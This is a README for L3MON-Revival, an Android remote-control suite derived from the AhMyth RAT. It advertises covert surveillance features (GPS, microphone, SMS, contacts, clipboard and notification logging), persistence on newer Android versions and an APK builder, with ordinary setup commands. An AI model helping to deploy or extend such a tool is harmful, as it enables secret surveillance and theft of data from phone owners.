# L3MON-Revival
<p align="center">
<img src="https://github.com/D3VL/L3MON/raw/master/server/assets/webpublic/logo.png" height="60"><br>
A modernized and stabilized remote Android management suite, powered by NodeJS.
</p>

---

## 🛠️ Revival Credits
- **Revival Developer:** [OP AMINUL FF](https://github.com/OP-AMINUL-FF)
- **Original Developer:** [D3VL](https://github.com/D3VL)
- **Base Project:** [AhMyth](https://github.com/AhMyth/AhMyth-Android-RAT)

---

## 🚀 Key Improvements in Revival
- **Android 10/11/12+ Support:** Added Foreground Service and Battery Optimization whitelisting to keep the app alive.
- **Modern Java Support:** Works with Java 11, 17, and newer (No longer restricted to Java 8).
- **Socket.io v4:** Upgraded connection engine for better stability and security.
- **Universal Installer:** One-click setup for Termux, Kali Linux, Ubuntu, and Windows.
- **Security:** Added Bcrypt hashing for admin login.
- **Bug Fixes:** Fixed APK build errors, path-with-space issues, and port limitations (>25565).

---

## 📱 Features
- ✅ GPS Logging
- ✅ Microphone Recording
- ✅ View Contacts & Call Logs
- ✅ SMS Management (View & Send)
- ✅ File Explorer & Downloader
- ✅ Live Clipboard & Notification Logging
- ✅ Built-in APK Builder with modern patches

---

## ⚙️ Installation

### 1. Auto-Setup (Recommended)
This will automatically detect your OS and install everything.

#### **For Linux / Termux / Kali:**
```bash
chmod +x setup.sh
./setup.sh
```

#### **For Windows:**
- **Option 1:** Double-click `setup.bat`.
- **Option 2 (CMD/PowerShell):**
  ```cmd
  setup.bat
  ```

### 2. Manual Setup
If you prefer manual steps:
1. `npm install`
2. `npm install pm2 -g`
3. `pm2 start index.js`

---

## 🔑 Login Configuration
The default login uses the credentials set in `maindb.json`. 
To change:
1. Edit `maindb.json`.
2. Set your `username`.
3. Set your `password` (Supports Bcrypt or MD5).

---

## ⚠️ Disclaimer
<b>OP AMINUL FF and D3VL provide no warranty with this software. 
L3MON-Revival is built for Educational and Internal use ONLY. 
The developers are not responsible for any direct or indirect damage caused by this tool.</b>

<br>
<p align="center">Modernized with ❤️ By <a href="https://github.com/OP-AMINUL-FF">OP AMINUL FF</a></p>
